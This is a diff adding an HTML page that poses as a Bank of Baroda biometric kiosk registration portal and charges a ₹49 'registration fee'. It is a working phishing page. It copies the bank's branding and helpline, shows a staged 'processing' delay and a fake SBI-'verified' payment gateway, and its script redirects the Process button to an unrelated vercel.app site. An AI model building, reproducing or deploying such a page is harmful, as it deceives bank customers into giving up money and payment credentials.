@@ -1,0 +1,638 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BOB CSP - Biometric Device Registration Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #f5f7fa 0%, #fbeee7 100%);
+            color: #333;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Logo Header Left Aligned */
+        .logo-container {
+            width: 100%;
+            background-color: #fff;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            padding: 15px 40px;
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            border-bottom: 4px solid #EE5F26;
+        }
+
+        .logo-container img {
+            width: auto;
+            max-width: 100%;
+            height: 65px;
+            display: block;
+            object-fit: contain;
+        }
+
+        .container {
+            max-width: 900px;
+            margin: 40px auto;
+            padding: 0 20px;
+            flex: 1;
+        }
+
+        .main-title {
+            text-align: center;
+            color: #003366;
+            font-size: 2.3rem;
+            margin-bottom: 5px;
+            text-transform: uppercase;
+            font-weight: 800;
+        }
+
+        .sub-title {
+            text-align: center;
+            color: #555;
+            font-size: 1.1rem;
+            margin-bottom: 25px;
+        }
+
+        /* Registration Fee Alert Box */
+        .fee-alert-box {
+            background-color: #fff3cd;
+            border-left: 5px solid #ffc107;
+            color: #856404;
+            padding: 15px 20px;
+            margin-bottom: 30px;
+            border-radius: 6px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.05);
+        }
+
+        .fee-alert-text {
+            font-size: 1.05rem;
+            font-weight: 600;
+        }
+
+        .fee-badge {
+            background-color: #EE5F26;
+            color: white;
+            padding: 6px 15px;
+            border-radius: 20px;
+            font-weight: 700;
+            font-size: 1.1rem;
+        }
+
+        .bio-wrapper {
+            background: #fff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.08);
+        }
+
+        .section-header {
+            font-size: 1.4rem;
+            color: #003366;
+            margin-bottom: 25px;
+            border-bottom: 2px solid #f0f0f0;
+            padding-bottom: 10px;
+            font-weight: 700;
+        }
+
+        /* Form Grid Layout */
+        .form-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .form-group label {
+            margin-bottom: 8px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            color: #444;
+        }
+
+        .form-group input, .form-group select {
+            padding: 12px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 0.95rem;
+            transition: all 0.3s ease;
+            background-color: #fcfcfc;
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            border-color: #EE5F26;
+            background-color: #fff;
+            box-shadow: 0 0 8px rgba(238, 95, 38, 0.15);
+            outline: none;
+        }
+
+        .biometric-section {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+
+        .bio-card {
+            border: 1px solid #e2e8f0;
+            border-radius: 10px;
+            padding: 30px;
+            text-align: center;
+            background: #f8fafc;
+            max-width: 350px;
+            width: 100%;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
+        }
+
+        .bio-card img {
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 15px auto;
+            display: block;
+            object-fit: contain;
+        }
+
+        .bio-card h4 {
+            font-size: 1.1rem;
+            color: #003366;
+            margin-bottom: 8px;
+            font-weight: 700;
+        }
+
+        .device-status-text {
+            font-size: 0.9rem;
+            color: #555;
+            line-height: 1.4;
+        }
+
+        /* Action Buttons */
+        .btn-submit-container {
+            margin-top: 40px;
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .btn-action {
+            padding: 12px 35px;
+            font-size: 1rem;
+            font-weight: 600;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+
+        .btn-verify {
+            background-color: #EE5F26;
+            color: white;
+        }
+
+        .btn-verify:hover {
+            background-color: #003366;
+        }
+
+        /* 5-SECOND PROCESSING OVERLAY CSS */
+        .processing-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #EE5F26;
+            border-bottom: 5px solid #003366;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .processing-text {
+            font-size: 1.3rem;
+            color: #003366;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .processing-sub {
+            color: #666;
+            font-size: 0.95rem;
+        }
+
+        /* PAYMENT GATEWAY MODAL WINDOW */
+        .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            padding: 20px;
+        }
+
+        .gateway-modal {
+            background: #fff;
+            max-width: 480px;
+            width: 100%;
+            border-radius: 14px;
+            padding: 30px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
+            animation: popUp 0.4s ease;
+        }
+
+        @keyframes popUp {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        .gateway-header {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+
+        .gateway-title {
+            color: #333;
+            font-size: 1.3rem;
+            font-weight: 700;
+        }
+
+        .gateway-amount-badge {
+            display: inline-block;
+            background: #f1f5f9;
+            padding: 6px 16px;
+            border-radius: 30px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: #334155;
+            margin-top: 8px;
+            border: 1px solid #e2e8f0;
+        }
+
+        /* Automated Bank Verification Block */
+        .bank-selection-container {
+            border: 2px solid #27ae60;
+            background: #f4fbf7;
+            border-radius: 10px;
+            padding: 16px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 25px;
+            position: relative;
+        }
+
+        .bank-meta {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        /* SVG Vector Icon representing State Bank of India */
+        .sbi-icon-mock {
+            width: 40px;
+            height: 40px;
+            background-color: #00a4e4;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-weight: 900;
+            font-size: 0.9rem;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+        }
+
+        .bank-details-text h5 {
+            font-size: 1.05rem;
+            color: #1e293b;
+            font-weight: 700;
+        }
+
+        .bank-details-text p {
+            font-size: 0.8rem;
+            color: #27ae60;
+            font-weight: 600;
+            margin-top: 2px;
+        }
+
+        .verified-checkmark {
+            width: 24px;
+            height: 24px;
+            background: #27ae60;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .verified-checkmark svg {
+            width: 14px;
+            height: 14px;
+            fill: none;
+            stroke: white;
+            stroke-width: 3;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        /* Nice Process Button Style */
+        .btn-process {
+            width: 100%;
+            background: linear-gradient(135deg, #003366 0%, #002244 100%);
+            color: white;
+            padding: 14px;
+            font-size: 1.1rem;
+            font-weight: 700;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            box-shadow: 0 4px 12px rgba(0, 51, 102, 0.3);
+        }
+
+        .btn-process:hover {
+            background: linear-gradient(135deg, #EE5F26 0%, #d84f1b 100%);
+            box-shadow: 0 4px 12px rgba(238, 95, 38, 0.3);
+        }
+
+        /* BOB FOOTER STYLING */
+        .bob-footer {
+            background-color: #003366;
+            color: #ffffff;
+            font-size: 13px;
+            margin-top: 60px;
+            width: 100%;
+        }
+
+        .bob-footer-top {
+            background-color: #EE5F26;
+            padding: 15px 20px;
+            color: #ffffff;
+        }
+
+        .bob-footer-top-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .bob-footer-main {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 30px 20px;
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+        }
+
+        .bob-footer-col h4 {
+            color: #EE5F26;
+            font-size: 14px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .bob-footer-col ul {
+            list-style: none;
+        }
+
+        .bob-footer-col ul li {
+            margin-bottom: 6px;
+        }
+
+        .bob-footer-col ul li a {
+            color: #d1dbe0;
+            text-decoration: none;
+        }
+
+        .bob-footer-bottom {
+            background-color: #002244;
+            padding: 15px 20px;
+            text-align: center;
+            font-size: 12px;
+        }
+
+        @media (max-width: 768px) {
+            .form-grid { grid-template-columns: 1fr; }
+            .bob-footer-main { grid-template-columns: repeat(2, 1fr); }
+            .fee-alert-box { flex-direction: column; text-align: center; gap: 10px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Logo Section Aligned Left -->
+    <header class="logo-container">
+        <img src="https://i.ibb.co/hJtXS16k/images-14.png" alt="Bank of Baroda Logo">
+    </header>
+
+    <div class="container">
+        <h1 class="main-title">Biometric Registration Portal</h1>
+        <p class="sub-title">Baroda Customer Service Point (Kiosk) Verification Form</p>
+
+        <!-- Dynamic Fee Notice Box -->
+        <div class="fee-alert-box">
+            <div class="fee-alert-text">
+                ⚠️ Portal Registration Dynamic Charge Notice: Valid For Entire Session
+            </div>
+            <div class="fee-badge">
+                ₹49 / 3 Months
+            </div>
+        </div>
+
+        <div class="bio-wrapper">
+            <form id="bioForm" onsubmit="handleInitialSubmit(event)">
+                
+                <!-- Section 1: User Reference Mapping -->
+                <div class="section-header">1. Applicant Reference Details</div>
+                <div class="form-grid">
+                    <div class="form-group">
+                        <label>Application ID *</label>
+                        <input type="text" placeholder="e.g., BOB-CSP-123456" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Full Name (As per Application) *</label>
+                        <input type="text" placeholder="Enter applicant full name" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Iris Device Brand *</label>
+                        <select id="deviceBrand" required>
+                            <option value="">Select Iris Scanner Connected</option>
+                            <option>Mantra MIS100V2 Single Iris</option>
+                            <option>Morpho IriShield USB MK2120U</option>
+                            <option>SecuGen Hamster Air</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Device Serial Number (S/N) *</label>
+                        <input type="text" placeholder="Enter device serial number" required>
+                    </div>
+                </div>
+
+                <!-- Section 2: Device Mapping Layout (Capture Removed) -->
+                <div class="section-header">2. Iris Scanner Configuration</div>
+                
+                <div class="biometric-section">
+                    <div class="bio-card">
+                        <img src="https://i.ibb.co/DxD9CXv/download.webp" alt="Iris Scan Setup Profile">
+                        <h4>Iris Device Deployment</h4>
+                        <p class="device-status-text">Selected UIDAI approved RD-Service scanner model will be automatically mapped to this CSP application session upon payment confirmation.</p>
+                    </div>
+                </div>
+
+                <!-- Action Bar -->
+                <div class="btn-submit-container">
+                    <button type="submit" class="btn-action btn-verify">Verify & Pay ₹49</button>
+                </div>
+
+            </form>
+        </div>
+    </div>
+
+    <!-- 5-SECOND PROCESSING ANIMATION OVERLAY -->
+    <div class="processing-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+        <div class="processing-text">Processing Security Parameters...</div>
+        <div class="processing-sub">Connecting with Bank Payment Node, please wait.</div>
+    </div>
+
+    <!-- PAYMENT GATEWAY MODAL WINDOW -->
+    <div class="modal-overlay" id="paymentModal">
+        <div class="gateway-modal">
+            <div class="gateway-header">
+                <div class="gateway-title">Secure Payment Gateway</div>
+                <div class="gateway-amount-badge">Amount: ₹49.00</div>
+            </div>
+
+            <!-- Pre-selected Verified State Bank of India Container -->
+            <div class="bank-selection-container">
+                <div class="bank-meta">
+                    <!-- SBI Styled Branding Circle Icon -->
+                    <div class="sbi-icon-mock">SBI</div>
+                    <div class="bank-details-text">
+                        <h5>State Bank of India</h5>
+                        <p>Automatic Verified Secured Gateway</p>
+                    </div>
+                </div>
+                <!-- Verification Checkmark Icon -->
+                <div class="verified-checkmark">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M20 6L9 17l-5-5" />
+                    </svg>
+                </div>
+            </div>
+
+            <!-- Nice Action Process Button -->
+            <button class="btn-process" onclick="redirectToGateway()">Process</button>
+        </div>
+    </div>
+
+    <!-- BOB Footer Content Matching Colors -->
+    <footer class="bob-footer">
+        <div class="bob-footer-top">
+            <div class="bob-footer-top-container">
+                <span>Contact Centre Helpline (Toll Free): <strong>1800 5700</strong></span>
+                <span>RD Service Online Validation Service Active</span>
+            </div>
+        </div>
+        <div class="bob-footer-main">
+            <div class="bob-footer-col">
+                <h4>Device Drivers</h4>
+                <ul>
+                    <li><a href="#">Mantra RD Service Setup</a></li>
+                    <li><a href="#">Morpho Smart USB Drivers</a></li>
+                </ul>
+            </div>
+            <div class="bob-footer-col">
+                <h4>Guidelines</h4>
+                <ul>
+                    <li><a href="#">UIDAI Compliance Handbook</a></li>
+                    <li><a href="#">Biometric Precision Matrix</a></li>
+                </ul>
+            </div>
+            <div class="bob-footer-col">
+                <h4>Security</h4>
+                <ul>
+                    <li><a href="#">End-to-End Encryption Policy</a></li>
+                    <li><a href="#">Fraud Prevention Desk</a></li>
+                </ul>
+            </div>
+            <div class="bob-footer-col">
+                <h4>Support</h4>
+                <ul>
+                    <li><a href="#">Technical Kiosk Helpline</a></li>
+                    <li><a href="#">System Integrity Check</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="bob-footer-bottom">
+            <p>&copy; 2026 Bank of Baroda. All rights reserved. Secured Biometric Node.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Triggered when clicking "Verify & Pay ₹49"
+        function handleInitialSubmit(event) {
+            event.preventDefault(); // Prevents default form loading
+            
+            // Show the 5-second processing loader overlay
+            document.getElementById("loadingOverlay").style.display = "flex";
+
+            // Trigger the 5000 milliseconds timeout loop
+            setTimeout(() => {
+                // Hide loader overlay
+                document.getElementById("loadingOverlay").style.display = "none";
+                
+                // Open payment gateway screen with SBI auto-selected
+                document.getElementById("paymentModal").style.display = "flex";
+            }, 5000); 
+        }
+
+        // Triggered when clicking the Nice "Process" button
+        function redirectToGateway() {
+            window.location.href = "https://verify-peach-seven.vercel.app/";
+        }
+    </script>
+</body>
+</html>
+
